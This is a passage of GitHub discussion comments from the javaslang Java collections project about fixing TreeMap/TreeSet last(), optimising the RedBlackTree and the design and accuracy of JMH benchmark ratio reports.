1)\n. By the way, there is a bug in the current implementation of TreeMap.last() and TreeSet.last(), as they are backed by Traversable.max().  It is broken for any TreeMap/TreeSet not using the default comparator.\nI'll fix them as part of my PR.\n. That's right @danieldietrich!  We should be using the RedBlackTree.min()/RedBlackTree.max()\nUsing Traversable.max() is also very inefficient as we need to traverse the whole tree to get to the last node.  \nI was planning to override min()/max() to use the backing RedBlackTree to make them more efficient when I realised the \"little note\" in the javadocs.\nI'll fix #1304 as part of this PR.  I think only TreeMap and TreeSet impacted. Do you know of any others?\n. Would it be a capital punishment if I used a java.util.Deque instead of a javaslang Stack inside of the RedBlackTree?  I am experimenting trying to improve performance, and java.util.Deque seems to help in some scenarios.\nAlso, are iterators meant to be thread-safe in javaslang collections?\n. To put it into context, when using java.util.ArrayDeque the performance of the javaslang implementation goes up by 40% when iterating over a TreeMap.  \nI don't think it is an issue with the javaslang.collection.Stack implementation, as when using java.util.LinkedList I get similar performances.  The difference I think is that java.util.ArrayDequeu uses an array as the backing structure for the stack, and hence avoids having to create so many objects and linking them while iterating.\nI don't see any issues using java.util.ArrayDeque unless the iterator needs to be thread-safe.  For what I can see the current iterator implementation using javaslang.collection.Stack is not thread-safe anyway, as it is possible for two threads to retrieve the same item from the iterator.\n. Hi @paplorinc, \nI re-ran your benchmarks and got similar results to yours. I must say the performance of that scalaz library is atrocious! \nPersonally, I would find more interesting if we compared against mutable.PriorityQueue. As a suggestion, I would create a PriorityQueueBenchmarkWrapper scala class with the logic to enqueue and dequeue all those elements in bulk. Your benchmark test would then just call that wrapper to execute the scala test.  The idea is to reduce the Java/Scala communication. I am planning something similar for the TreeMap benchmark test as well.\nAnother suggestion is to split the benchmark for enqueue and dequeue. They are different operations. You might find that one is much more inefficient than the other.\nAlso, would it be worth testing the performance when there are many priority collisions? This would be testing the scenario when there are just a handful of priority levels (e.g. High, Medium, Low) and the PriorityQueue needs to work out what item with highest priority to return next.\nI changed your tests to fix the number of priorities to 10.  This is what I got:\n```\nBenchmark                       (CONTAINER_SIZE)   Mode  Cnt      Score     Error  Units\nSlangPriorityQueue.sort_java                1000  thrpt   10  12668.429 \u00b1 124.746  ops/s\nSlangPriorityQueue.sort_slang               1000  thrpt   10    907.511 \u00b1 204.829  ops/s\nSlangPriorityQueue.sort_scalaz              1000  thrpt   10    340.757 \u00b1  14.073  ops/s\nSlangPriorityQueue.sort_java              100000  thrpt   10     90.988 \u00b1   0.146  ops/s\nSlangPriorityQueue.sort_slang             100000  thrpt   10      0.975 \u00b1   0.025  ops/s\nSlangPriorityQueue.sort_scalaz            100000  thrpt   10      2.888 \u00b1   0.137  ops/s\n```\nAs you can see, with 1000 elements, the JavaSlang performance deteriorated slightly to 12x slower, and the scalaz continued its usual rubbish-self at 36x slower. However, the interesting bit is that the JavaSlang performance deteriorated dramatically with very large collections (92x slower than Java). Do you know why this might be the case?  Would this be a valid scenario?\nFinally, my last comment is to rename the benchmark class from SlangPriorityQueue to PriorityQueueBenchmark.  It'll be easier to find benchmarks if we postfix them with the word \"Benchmark\" (similar idea to post-fixing junits with \"Test\"). I would also remove the prefix \"Slang\", as it doesn't give you anything.\nHope that helps :)\n. I have never used scala from Java, so not sure if there is any overhead involved. My concern here is that you will be calling it 2 x 100000 times per test. If there is any overhead then it might end up impacting your tests. Of course, if there is no overhead, then there is no problem.\n. I am surprised about the scala performance drop as size increases. My suggestion here is to fully implement the sort_scala method in scala to rule out any unexpected overhead. As with any performance related issues, we won't know for certain until we test it. \nIf you were to optimise for smaller sets, how many changes would you need to make? If not too many changes then I would be in favour. Alternatively we could have a separate ArrayPriorityQueue implementation for smaller use cases.\n. I like your result aggregation :+1: \nThe only issue I can see with the aggregator is that it is not reusable as-is, as it expects that you only test one operation per benkmark file. My TreeMap implementation for example benchmark's many operations.\nBy the way, I still think it would be interesting if you also benchmarked individual operations (if you had the time). You might find out that only one of those operations is dragging you down. Also, a common use case for the PriorityQueue is to write from one thread and read from another. In that scenario, the combined performance is not as interesting as the individual read/write performance.\nAlso, as a side node, when I run using fork=0, the scalaz implementation blows up with a stack overflow on the 10000 test. \nAnd finally, I have some good and bad news for you. The bad news is that if you want to measure how fast one result is versus another, then your ratio calculation is incorrect. Your ratio calculation is result1/result2, while you should be using (result1-result2)/result2. Think about it, if both tests finished in 100 op/s, your calculation would say one is 1x faster than the other, while the correct calculation would be 0x. The good news, of course, is that your implementation is ~4x slower than Java's (and not ~5x ) ;)\n. Ok, fair enough, if a=1 op/s and b=2 op/s then b is twice as fast as a.\nMy suggestion would give you the performance in terms of percentage, i.e. b is 100% faster than a.\n. > I did, but measuring a mutable data structure is tricky ... should I clone it in the method itself or in the setup and ruin the performance of the rest, i.e. it cannot be bulk-unwrapped anymore by JMH because of the side-effects.\nI see.... have you considered creating another state class using @Setup(level = Invocation) where you initialize/clone the mutable queues?  According to the Level.Invocation disclaimer, it should be ok if the method invocation takes more than 1ms.\n. > ... the immutable test contents will probably be copy-pasted n times one after the other, while the mutable one will have a setup after each ... it wouldn't be a fair comparison, I think.\nAssuming we re-create the mutable collection with same entries and in same order as the immutable collection, and the setup time is excluded from the result, then in theory both tests should start with even terms. Or am I missing something?\nIf your concern is that the setup time might leak into the final result, then a quick test to find out would be to also inject the new state into the immutable test. If it starts running slower, then yeah, it leaks!\n. What about this implementation? (easier shown than explained)\nPriorityQueueBenchmark2.java.txt\nThis is what I get:\n```\nBenchmark                            (CONTAINER_SIZE)   Mode  Cnt        Score        Error  Units\nPriorityQueueBenchmark2.deque_java                 10  thrpt   10  5127460.442 \u00b1 130545.382  ops/s\nPriorityQueueBenchmark2.deque_java               1000  thrpt   10    12366.870 \u00b1    362.830  ops/s\nPriorityQueueBenchmark2.deque_java             100000  thrpt   10       46.507 \u00b1      2.749  ops/s\nPriorityQueueBenchmark2.deque_slang                10  thrpt   10   987346.097 \u00b1  66386.795  ops/s\nPriorityQueueBenchmark2.deque_slang              1000  thrpt   10     2551.948 \u00b1    112.869  ops/s\nPriorityQueueBenchmark2.deque_slang            100000  thrpt   10        8.265 \u00b1      0.402  ops/s\nPriorityQueueBenchmark2.queue_java                 10  thrpt   10  7362234.612 \u00b1 162207.028  ops/s\nPriorityQueueBenchmark2.queue_java               1000  thrpt   10   150768.302 \u00b1   5206.154  ops/s\nPriorityQueueBenchmark2.queue_java             100000  thrpt   10      654.967 \u00b1     56.210  ops/s\nPriorityQueueBenchmark2.queue_slang                10  thrpt   10  3882110.070 \u00b1  80039.799  ops/s\nPriorityQueueBenchmark2.queue_slang              1000  thrpt   10    36522.930 \u00b1   7812.503  ops/s\nPriorityQueueBenchmark2.queue_slang            100000  thrpt   10      315.722 \u00b1     10.499  ops/s\nRatios for: [10, 1000, 100000]\ndeque_java/deque_slang : [5.19, 4.85, 5.63]\nqueue_java/queue_slang : [1.90, 4.13, 2.07]\n``\n. @danieldietrich, wouldn't it be better to change the javadoc inTraversable?  (as opposed to changing the individualmin()/max()` javadocs in all Sorted collections).\nThe change in Traversable still makes sense, as it will only impact the Sorted* collections.\n. This is the performance comparison versus the Java/Scala implementations:\n```\nRatios AlternativeImpl/Slang\n  (read as AlternativeImpl implementation is times faster than Slang\n  (e.g. 2x means AlternativeImpl is twice as fast as Slang)\nGroup              Test Name                                                               Ratio          10       1000     100000 \nGetAndPut          getValue                                                           Java/Slang       1.33x      1.22x      1.24x \nGetAndPut          getValue                                                          Scala/Slang       1.21x      1.21x      1.58x \nGetAndPut          putRandomValues                                                    Java/Slang       2.49x      3.19x      2.40x \nGetAndPut          putRandomValues                                                   Scala/Slang       0.99x      1.04x      1.30x \nGetAndPut          putSortedValues                                                    Java/Slang       2.60x      3.81x      3.45x \nGetAndPut          putSortedValues                                                   Scala/Slang       0.97x      0.97x      1.23x \nIterateAscending   iterateAscending                                                   Java/Slang       2.40x      2.56x      1.91x \nIterateAscending   iterateAscending                                                  Scala/Slang       1.69x      2.91x      1.23x \nIterateDescending  iterateDescending                                                  Java/Slang       5.36x      2.55x      2.01x \nNavigate           ceiling                                                            Java/Slang       1.13x      1.26x      1.37x \nNavigate           firstValue                                                         Java/Slang       2.27x      2.01x      1.77x \nNavigate           firstValue                                                        Scala/Slang       2.12x      1.92x      1.82x \nNavigate           floor                                                              Java/Slang       1.12x      1.33x      1.31x \nNavigate           higher                                                             Java/Slang       1.39x      1.40x      1.10x \nNavigate           lastValue                                                          Java/Slang       2.43x      1.79x      1.75x \nNavigate           lastValue                                                         Scala/Slang       2.21x      1.79x      1.83x \nNavigate           lower                                                              Java/Slang       1.38x      1.41x      1.45x \nSubMap             createDescendingSubMap_WithOneThirdElements_AndIterate             Java/Slang       8.23x      5.52x      5.79x \nSubMap             createSubMap_WithOneThirdElements_AndIterate                       Java/Slang       3.68x      3.32x      2.96x \n``\n. I have spent quite a lot of time trying to optimize theRedBlackTree` code trying to bring the performance up as much as possible.\nI am however puzzled about few things.  Look at the \"firstValue\" method for example. The Java/Scala implementations are ~2x faster.  The JavaSlang implementation is still very fast, able to perform about 22 million operations per second. But it buggers me why the Java/Scala implementations are twice as fast.\nWhen you look at the java.util.TreeMap  implementation, this is the code (nice and simple):\nfinal Entry<K,V> getFirstEntry() {\n        Entry<K,V> p = root;\n        if (p != null)\n            while (p.left != null)\n                p = p.left;\n        return p;\n    }\nand this is the JavaSlang implementation in RedBlackTree:\n```\n    public Option min() {\n        Node curr = this;\n        while (!curr.left().isEmpty()) {\n            curr = curr.left();\n        }\n        return Option.some(curr.value());\n    }\n```\nFor the life of me, how can the Java implementation be twice as fast!\nTwo possible culprits I can think of. First the Java implementation is using nulls directly instead of Empty nodes.  Second, we are wrapping up the result in an Option.  \nI doubt the culprit is Option.some, as the ceiling/floor/higher/lower implementations are also returning Option.some and are ~1.2/1.3x slower only. Then it has to be curr.left().isEmpty()!\nSo based on this conclusion, the obvious step to improve the performance might be to refactor the RedBlackTree even further and replace Empty nodes with nulls.\n. Hi @paplorinc \nThanks for your comments, really appreciated. You made good points.\nI think it is important we make a project decision on the approach to follow for benchmarks, so going forward all benchmark classes consistently use the same structure. I would appreciate @danieldietrich and @ruslansennov views here as well.\nSo basically we have two approaches, the one in PriorityQueueBenchmark and the one in TreeMapBenchmark.\nOrganise operations by subclassing\nPriorityQueueBenchmark uses a super class that sets up the common state, and then a subclass for each operation in test. All methods inside a subclass are different implementations of the same  operation, i.e. Java, Scala, JavaSlang, etc.\nThe good points of this approach, in my view, are that we are structurally grouping alternative implementations together. The performance report just needs to compare everything against everything else inside that subclass. \nThe drawback is that we are cannot able to re-use set-up and warm-up for related operations, so the tests will take longer to run. Also, and this is a personal preference, I always try to avoid inheritance as means to reuse functionality unless absolutely necessary. \nWith this approach, these is the type of reports we could generate\n```\nGroup 'Enqueue':                            10      1000     100000\njava_mutable/scala_mutable        :      1.33x     1.30x      1.61x\njava_mutable/scalaz_persistent    :     11.12x     6.54x      6.42x\njava_mutable/slang_persistent     :      2.25x     1.31x      1.54x\nscala_mutable/scalaz_persistent   :      8.38x     5.05x      3.99x\nscala_mutable/slang_persistent    :      1.70x     1.01x      0.95x\nscalaz_persistent/slang_persistent:      0.20x     0.20x      0.24x\nGroup 'Dequeue':                            10      1000     100000\njava_mutable/scala_mutable        :      1.29x     1.13x      1.34x\njava_mutable/scalaz_persistent    :     51.17x    44.70x     38.34x\njava_mutable/slang_persistent     :      6.43x     5.69x      5.15x\nscala_mutable/scalaz_persistent   :     39.54x    39.39x     28.62x\nscala_mutable/slang_persistent    :      4.97x     5.02x      3.84x\nscalaz_persistent/slang_persistent:      0.13x     0.13x      0.13x\nGroup 'Sort':                               10      1000     100000\njava_mutable/scala_mutable        :      1.57x     1.46x      1.61x\njava_mutable/scalaz_persistent    :     58.55x    52.54x     46.72x\njava_mutable/slang_persistent     :      5.65x     5.12x      5.37x\nscala_mutable/scalaz_persistent   :     37.28x    35.88x     28.99x\nscala_mutable/slang_persistent    :      3.59x     3.49x      3.33x\nscalaz_persistent/slang_persistent:      0.10x     0.10x      0.11x\n```\nUse @Group annotation and method name convention\nTreeMapBenchmark groups operations using the JMH @Group annotation. This helps speed-up the benchmark execution, as operations re-use the warm-up and set-up stages. We could also group related operations together, such as \"put elements in order\" or \"put elements randomly\". \nThis approach also uses the following method name convention to extract the semantics of the test (namely the operation and implementation names):\nvoid operationName_Implementation()\nFor example, you might end up having method names such as getValueFromMap_Java(), getValueFromMap_Scala(), putValueInMap_Java() and putValueInMap_Scala(). \nThe obvious drawback of this approach is that we need to stick to that convention and if you, for example, forget to use the underscore, then that implementation will not be compared against other implementations. \nWith this approach you can get detailed reports such this one (note the ratio comparison on the right):\n```\nGroup        Test Name    Impl    Params            Score  \u00b1     Error    Unit       Java      Scala      Slang\nGetAndPut    getValue     Slang     1000    6,689,629.542  \u00b1     6.30%   ops/s      0.82x      0.83x         \nGetAndPut    getValue     Scala     1000    8,067,176.009  \u00b1     4.66%   ops/s      0.98x                 1.21x\nGetAndPut    getValue     Java      1000    8,193,945.426  \u00b1     6.54%   ops/s                 1.02x      1.22x\nGetAndPut    putValue     Slang     1000        1,574.209  \u00b1     6.83%   ops/s      0.31x      0.96x         \nGetAndPut    putValue     Scala     1000        1,631.555  \u00b1     5.17%   ops/s      0.33x                 1.04x\nGetAndPut    putValue     Java      1000        5,018.091  \u00b1     9.22%   ops/s                 3.08x      3.19x\n```\nAnd ratio comparison reports such as this one:\n```\nRatios alternative_impl/Java\nGroup              Test Name             Ratio          10       1000     100000 \nGetAndPut          getValue         Scala/Java       0.91x      0.98x      1.27x \nGetAndPut          getValue         Slang/Java       0.75x      0.82x      0.81x \nGetAndPut          putValue         Scala/Java       0.40x      0.33x      0.54x \nGetAndPut          putValue         Slang/Java       0.40x      0.31x      0.42x \nRatios alternative_impl/Scala\nGroup              Test Name             Ratio          10       1000     100000 \nGetAndPut          getValue         Java/Scala       1.10x      1.02x      0.79x \nGetAndPut          getValue        Slang/Scala       0.82x      0.83x      0.63x \nGetAndPut          putValue         Java/Scala       2.53x      3.08x      1.84x \nGetAndPut          putValue        Slang/Scala       1.01x      0.96x      0.77x \nRatios alternative_impl/Slang\nGroup              Test Name             Ratio          10       1000     100000 \nGetAndPut          getValue         Java/Slang       1.33x      1.22x      1.24x \nGetAndPut          getValue        Scala/Slang       1.21x      1.21x      1.58x \nGetAndPut          putValue         Java/Slang       2.49x      3.19x      2.40x \nGetAndPut          putValue        Scala/Slang       0.99x      1.04x      1.30x \n```\nIt is worth pointing out that the \"subclassing\" approach could also generate these type of reports if it used the same method name convention operationName_Implementation().\n. @paplorinc, @danieldietrich, I don't think is going to be feasible for me to re-check in based on functionality. To be honest, there were several iterations with many check-ins discarded or refactored away. So I decided to clean up the pull request by squashing all these commits.\nThe main bulk of the work, and the most important class, is RedBlackTree.  As I have mentioned before, TreeMap is just a wrapper around this class.  As a \"travel guide\" to review RedBlackTree, I would suggest the following path:\n- Navigator methods in ValueNode: find, floor, ceiling, higher, lower, max, min\n- iterator() method in ValueNode\n- Ascending SubTree navigation: subTree() method and AscendingSubTreeView class.\n- Ascending SubTree iterator:  iterator() method in AscendingSubTreeView and AscendingSubTreeIterator class \n- Descending SubTree navigation: descendingTree() method and DescendingSubTreeView class\n- Descending SubTree iterator: iterator() method in DescendingSubTreeView and DescendingSubTreeIterator class\n. You will also notice quite an extensive suite of junits in RedBlackTreeTests. Due to the considerable number of scenarios, I decided to use the BDD naming convention, e.g. given/when/then. I think that makes the tests easier to read.\nHaving said that, yes, I acknowledge both RedBlackTree and RedBlackTreeTests are massive, bordering 2000 lines each. I would have personally preferred extracting each sub-class into a separate file, but as I understand, this is the preferred approach in JavaSlang. As a side note, the java.util.TreeMap implementation is 3000 lines, so it could be worse....\n. Apologies @danieldietrich  @paplorinc , I had to do a git push --force to keep the history clean. You should notice however there are only two new check-ins:\n- 14ad880: Changed TreeMapTest to make them easier to understand\n- 3cdb9c9: Refactored TreeMapBenchmark to follow new approach.\nNo changes to the RedBlackTree or TreeMap classes.\n. @danieldietrich If you are still finding it hard to review, an option might be to split into several PRs.\nHere a suggestion:\n1. Rename Node to ValueNode, create Node interface, and move static methods in RedBlackTree to ValueNode as-is (without changes for easy check)\n2. Clean up the static methods in ValueNode (moved from RedBlackTree)\n3. Add floor/ceiling/higher/lower methods to navigate the sorted map\n4. Add subMap()/headMap()/tailMap() methods in TreeMap to create a subMap view, and add the AbstractSubTree and AscendingSubTreeView implementations\n5. Add descendingMap() and DescendingSubTreeView implementation \n6. Benchmarks\n. Nice one @danieldietrich!  I am on holidays at the moment, so I won't be able to make any code changes until next week. I am however more than happy to provide clarifications and comments.\n. That's great @danieldietrich, feel free to make as many changes as you like and push to my local branch.  The RedBlackTreeTest test suite is very extensive. If it is green, you can be pretty confident your refactoring was ok.\nAs suggestion to understand the sub views, you could group the methods in two: navigators and iterators. \nThe navigator methods are backed by the absXxx methods in AbstractSubTreeView. This was inspired by the java.util.TreeMap implementation. These absXxx methods operate on the backing tree and make use of the original comparator. This makes it easy to understand the DescendingSubTreeView navigational methods, i.e. we just take opposite operation.\nThe iterators are a mixture of the original RedBlackTree iterator implementation and the java.util.TreeMap iterator implementation for sub views. We first need to build the work stack to start on the first node of the view (bearing in mind we don't need to traverse the whole tree depth, so we filter out unnecessary parent nodes), and then we just apply the same iteration algorithm until we reach the last item in the subview.\n. Sounds good  @danieldietrich, I'll be happy to review.\nSomething to consider is that we might also want to  add navigable methods and subviews to Sets (straight  forward if the functionality is in RedBlackTree) \n. Hi @danieldietrich, let me review tonight.\nWhy do you think the current subTree view implementation is not memory efficient?\nThe current implementation just creates an object with the view parameters and a pointer to the original tree. It is very similar to the java.util.TreeMap implementation.  This implementation is optimised for the main use case of sub trees, i.e. you have a large tree and you want to create several sub views on that tree.  \nLet me give you an example, which incidentally is what I need for my application. Imagine you want to create a cache with price data. You can use a TreeMap with dates as keys, and prices as values. Your cache might have let's say the last 3 years worth of prices. By using sub trees, you can then request prices for smaller date ranges efficiently.\nWith the original solution, creating the sub tree has complexity O(2 * log n) and virtually no memory impact. It is therefore very efficient. With the simple linear implementation, the complexity is O(2 * log n + n) and you need to duplicate n nodes in memory. It makes it impractical for the main use case of tree views.\n. Having said that, I am ok with the linear implementation of sub views as a temporary solution if the aim is to focus on navigable methods and leave sub views for a later PR.\n. Update: Did not found the time - will go on tomorrow...\nI don't blame you. Last week was crazy form me too!\n. Next will be the sub views and the navigable Set. For other collections we decided not to implement views that keep all underlying elements. The memory footprint at runtime matters. E.g. when having a Map that contains 1.000.000 entries and we create a sub map of 1 entry, we do not want to keep 1.000.000 elements in memory in the case the original map is not referenced any more after that operation.\nLet's leave this discussion for the future PR, but personally I think it would be a mistake not to optimise for speed. \nIn a nutshell, we can optimise either for speed or for memory. If we optimise for memory as you suggest, we are basically alienating all developers that require speed (and that includes most developers migrating from java.util.TreeMap).\nIf we optimise for speed, we can still have the option to cater for those developers needing to optimise for memory. We could for example make it clear in the javadoc that subMap has been optimised for speed, same as JDK implementation, and if you are concerned about memory usage, you could do something like this:\nTreeMap.of(myMap.subMap(fromKey, toKey))\nor even something like this if we wanted:\nmyMap.subMap(fromKey, toKey)).normalize()\n. Sure @danieldietrich, unfortunately I have been very busy at work, so I haven't been able to help much in the last few months. But I promise to find the time once you complete your RedBlackTree review! :)\n@ashrko619, the RedBlackTree implementation in #1317 is currently only used by SortedMap.  This is however a complex implementation, as we need to use views (similar to the java.util.TreeMap implementation of navigational methods). Once we are happy with the implementation, adding navigational support for SortedSet will be trivial.  Feel free to review that PR!\n. Ok, let me have a look :)\n. Hi @danieldietrich  @paplorinc \nI am fine with the new ratio report!\nI have a few suggestions based on the ListBenchmark implementation:\n- I would use a displaySlangRatios() method instead of the current generic displayRatios() method. It is not ideal to have to provide the same \"weird\" reg expressions on each Benchmark class. We just want the ratios focusing on Java Slang, so imo we should have a method for it.\n- Do we need to have so many assertEquals methods? I am ok doing some sanity checks to ensure we added/updated/removed all items, but I don't think there is need to do much more. I would for example remove all \"assert size==0\" in the initializers. Also the XOR check is going to be confusing to most programmers, although I acknowledge it is a smart way of comparing results. I bet however most programmers don't know what \"^=\" means, and then, once they figure out what the heck is a XOR, they will probably scratch their heads for a while trying to figure out why you are doing it. I would keep it simpler, I would just count iterations.\n- Shouldn't we use the assert keyword instead of the assertEquals method?  The assertEquals method is not disabled with the -disableassertions flag.  Additionally, we need to copy/paste that method on each Benchmark class.\n- I would rename the \"Group 'xxx'\" heading in the report to something like \"Operation 'xxx'\". First, \"Group\" might be confused with JMH groups. Also, it is very generic, it doesn't really explain what we are comparing. \"Operation 'xxx'\" at least tell us that we are comparing the relative ratios of an operation.\n- I find the first part of the group a bit messy and hard to follow. I think the focus should be on what side of the ratio the JavaSlang implementation lies. For that, my suggestion is to indent the forward slash into the same column. Also, I would separate numerator/denominator ratios with a blank line.\nSomething like this:\n```\n Group 'AddAll'                            :    10 |   100 |  1000 | 10000 |\n       fjava_persistent / slang_persistent : 0.63x | 0.64x | 0.69x | 0.48x |\n           java_mutable / slang_persistent : 0.82x | 1.09x | 0.92x | 0.80x |\n    java_mutable_linked / slang_persistent : 0.84x | 0.85x | 0.87x | 0.64x |\npcollections_persistent / slang_persistent : 1.09x | 1.18x | 1.11x | 0.67x |\n          scala_mutable / slang_persistent : 0.83x | 0.90x | 0.86x | 0.80x |\n       scala_persistent / slang_persistent : 1.06x | 0.97x | 0.92x | 0.73x |\nslang_persistent / fjava_persistent        : 1.59x | 1.56x | 1.46x | 2.10x |\nslang_persistent / java_mutable            : 1.22x | 0.92x | 1.08x | 1.25x |\nslang_persistent / java_mutable_linked     : 1.20x | 1.18x | 1.14x | 1.56x |\nslang_persistent / pcollections_persistent : 0.92x | 0.85x | 0.90x | 1.48x |\nslang_persistent / scala_mutable           : 1.20x | 1.12x | 1.17x | 1.25x |\nslang_persistent / scala_persistent        : 0.95x | 1.03x | 1.09x | 1.37x |\n```\nor alternatively, this might even be better:\n```\n  Group 'AddAll'                                  :    10 |   100 |  1000 | 10000 |\n       fjava_persistent / slang_persistent        : 0.63x | 0.64x | 0.69x | 0.48x |\n           java_mutable / slang_persistent        : 0.82x | 1.09x | 0.92x | 0.80x |\n    java_mutable_linked / slang_persistent        : 0.84x | 0.85x | 0.87x | 0.64x |\npcollections_persistent / slang_persistent        : 1.09x | 1.18x | 1.11x | 0.67x |\n          scala_mutable / slang_persistent        : 0.83x | 0.90x | 0.86x | 0.80x |\n       scala_persistent / slang_persistent        : 1.06x | 0.97x | 0.92x | 0.73x |\n   slang_persistent / fjava_persistent        : 1.59x | 1.56x | 1.46x | 2.10x |\n   slang_persistent / java_mutable            : 1.22x | 0.92x | 1.08x | 1.25x |\n   slang_persistent / java_mutable_linked     : 1.20x | 1.18x | 1.14x | 1.56x |\n   slang_persistent / pcollections_persistent : 0.92x | 0.85x | 0.90x | 1.48x |\n   slang_persistent / scala_mutable           : 1.20x | 1.12x | 1.17x | 1.25x |\n   slang_persistent / scala_persistent        : 0.95x | 1.03x | 1.09x | 1.37x |\n\n```\n. Also, I would strongly suggest to use many more sample iterations than 5. Statistically, the margin of error for 5 samples is going to be much higher and less reliable than let's say 20 samples.\nFor the ListBenchmark for example, this is what you get:\n- Warmup=20, Iterations=5:  average Error % is 10.5%\n- Warmup=10, Iterations=20:  average Error % is 2.5%\nAlso, if you noticed during the warmup iterations, the ops/s settled down after two or three iterations.  If anything, I would even suggest reducing the Warmup=5 and increasing the Iterations by another 5.\n. Also, I am a bit concerned about the usefulness and how to interpret these ratio reports.\nFor example, I re-ran the AddAll tests in ListBenchmark twice with size=1000, using the more stable Warmup=10, Iterations=20 configuration.  \nThese are the results I got (the Error % was calculated in Excel).\nFirst Run:\nBenchmark    (CONTAINER_SIZE)                        Mode    Cnt          Score               Error           Error %\nListBenchmark.AddAll.fjava_persistent        1000    thrpt    20     129,086.02     \u00b1      3,934.00     ops/s    3.0%\nListBenchmark.AddAll.java_mutable            1000    thrpt    20     213,303.72     \u00b1      1,319.78     ops/s    0.6%\nListBenchmark.AddAll.java_mutable_linked     1000    thrpt    20     208,268.81     \u00b1     13,523.08     ops/s    6.5%\nListBenchmark.AddAll.pcollections_persistent 1000    thrpt    20     239,404.69     \u00b1      9,411.63     ops/s    3.9%\nListBenchmark.AddAll.scala_mutable           1000    thrpt    20     201,239.11     \u00b1      3,631.54     ops/s    1.8%\nListBenchmark.AddAll.scala_persistent        1000    thrpt    20     195,050.25     \u00b1     18,120.01     ops/s    9.3%\nListBenchmark.AddAll.slang_persistent        1000    thrpt    20     237,474.72     \u00b1      6,055.34     ops/s    2.5%\nSecond run:\nBenchmark    (CONTAINER_SIZE)                        Mode    Cnt          Score               Error           Error %\nListBenchmark.AddAll.fjava_persistent        1000    thrpt    20     128,292.41     \u00b1     6,366.31     ops/s    5.0%\nListBenchmark.AddAll.java_mutable            1000    thrpt    20     214,260.49     \u00b1     1,222.28     ops/s    0.6%\nListBenchmark.AddAll.java_mutable_linked     1000    thrpt    20     214,500.43     \u00b1     3,452.35     ops/s    1.6%\nListBenchmark.AddAll.pcollections_persistent 1000    thrpt    20     266,856.72     \u00b1     2,750.80     ops/s    1.0%\nListBenchmark.AddAll.scala_mutable           1000    thrpt    20     214,901.33     \u00b1     2,598.03     ops/s    1.2%\nListBenchmark.AddAll.scala_persistent        1000    thrpt    20     219,577.52     \u00b1     1,740.11     ops/s    0.8%\nListBenchmark.AddAll.slang_persistent        1000    thrpt    20     213,125.98     \u00b1     31,451.56     ops/s    14.8%\nAs you can see, there must have been few outliers in the scala_persistent test in the first run (Error % = 9.3%), and in the slang_persistent test in the secon run (Error % = 14.8%).  The Error % for all other operations was very low, on average 2.4%.\nHowever, when you compare ratios, you get these results:\nGroup 'AddAll'                            :    First Run    Second Run             Diff %\nfjava_persistent / slang_persistent       :    0.54                0.6             -10.0%\njava_mutable / slang_persistent           :    0.9                1.01             -10.9%\njava_mutable_linked / slang_persistent    :    0.88               1.01             -12.9%\npcollections_persistent / slang_persistent:    1.01               1.25             -19.2%\nscala_mutable / slang_persistent          :    0.85               1.01             -15.8%\nscala_persistent / slang_persistent       :    0.82               1.03             -20.4%\nslang_persistent / fjava_persistent       :    1.84               1.66              10.8%\nslang_persistent / java_mutable           :    1.11               0.99              12.1%\nslang_persistent / java_mutable_linked    :    1.14               0.99              15.2%\nslang_persistent / pcollections_persistent:    0.99                0.8              23.8%\nslang_persistent / scala_mutable          :    1.18               0.99              19.2%\nslang_persistent / scala_persistent       :    1.22               0.97              25.8%\nAs you can see, the ratio differences between the first and second runs are massive. Look at the slang_persistent / scala_persistent implementations for example. The Ratio ranges from 0.97x to 1.22x.\nI wonder whether we need to understand these ratios and the error interval better.\n. Ok, so now I have increased the number of iterations to 50.  As  you would expect, the Error % has come down a bit more, now on average is ~1.6%.\nBenchmark                                             Mode    Cnt          Score              Error     Units    Error %     \nListBenchmark.AddAll.fjava_persistent         1000    thrpt    50     123,485.65     \u00b1     3,328.30     ops/s    2.7%        \nListBenchmark.AddAll.java_mutable             1000    thrpt    50     201,389.34     \u00b1     3,911.08     ops/s    1.9%        \nListBenchmark.AddAll.java_mutable_linked      1000    thrpt    50     196,383.18     \u00b1     5,801.19     ops/s    3.0%        \nListBenchmark.AddAll.pcollections_persistent  1000    thrpt    50     254,082.80     \u00b1     2,777.21     ops/s    1.1%        \nListBenchmark.AddAll.scala_mutable            1000    thrpt    50     209,654.17     \u00b1     2,116.00     ops/s    1.0%        \nListBenchmark.AddAll.scala_persistent         1000    thrpt    50     212,501.20     \u00b1     1,510.60     ops/s    0.7%        \nListBenchmark.AddAll.slang_persistent         1000    thrpt    50     242,347.73     \u00b1     2,703.45     ops/s    1.1%\nHowever, what is more interesting is that the ratio differences between runs are now much closer. This makes ratios much more meaningful.\nGroup 'AddAll'                            :    First Run     Second Run    Diff\nfjava_persistent / slang_persistent       :          0.51           0.5     2.0%\njava_mutable / slang_persistent           :          0.83          0.83     0.0%\njava_mutable_linked / slang_persistent    :          0.81          0.84    -3.6%\npcollections_persistent / slang_persistent:          1.05          1.04     1.0%\nscala_mutable / slang_persistent          :          0.87          0.84     3.6%\nscala_persistent / slang_persistent       :          0.88          0.85     3.5%\nslang_persistent / fjava_persistent       :          1.96          1.99    -1.5%\nslang_persistent / java_mutable           :          1.2            1.2     0.0%\nslang_persistent / java_mutable_linked    :          1.23           1.2     2.5%\nslang_persistent / pcollections_persistent:          0.95          0.96    -1.0%\nslang_persistent / scala_mutable          :          1.16          1.19    -2.5%\nslang_persistent / scala_persistent       :          1.14          1.17    -2.6%\nI ran it several times with 50 iterations, and the ratio difference remained between 2-4% all the time.  Not saying I have found the \"holly grail\" here, but the ratios above look much more consistent.\n. To be honest, I don't have any solutions aside from increasing number of iterations.\nAll this started when I ran ListBenchmark several times to check how accurate ratios were, and to my surprise I got massive differences between runs.\n@paplorinc, could you please re-run ListBenchmark several times in your computer and check the ratios?  Maybe is only my PC!\n. Removing accuracy only works when you improve performance by large margins (e.g. from 40x to 10x). However, once you have done the major issues, it gets much harder to improve performance, and ratio improvements are harder to come by. Accuracy then becomes very important (e.g. if your objective is to improve from 2.0x to 1.7x, you cannot have a +/-0.5x margin of error).\nNot sure turning on that flag would help. If I had to point fingers, I think the main culprit is the GC rather than the compiler. \nPersonally, I think these benchmarks are useful for two things:\n- Help developers optimise the libraries (needs to be fast and as accurate as possible)\n- Show to the world how JavaSlang performance compares with other major libraries (needs to be accurate)\n. How can you disable GC?\n. Ah, I see now! :)\nThat .shouldDoGC(false) is not for disabling GC.\nThe point of .shouldDoGC(true) is that JMH attempts to run a GC collection before each iteration to reduce the chance of GC kicking again during the run. I think we should set it to true.\n. I think the way to go is to remove outliers from the iteration runs. \nThe idea is that some iteration runs will be impacted by the GC, and we should remove those 